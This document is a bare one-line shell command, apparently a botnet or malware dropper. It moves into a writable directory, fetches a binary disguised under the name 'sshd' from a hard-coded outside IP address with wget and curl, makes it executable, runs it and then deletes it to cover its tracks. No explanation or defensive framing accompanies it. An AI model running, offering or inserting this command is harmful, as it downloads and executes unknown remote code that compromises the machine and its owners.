cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.48.130/sshd; curl -O http://198.98.48.130/sshd; chmod +x sshd; ./sshd; rm -rf sshd
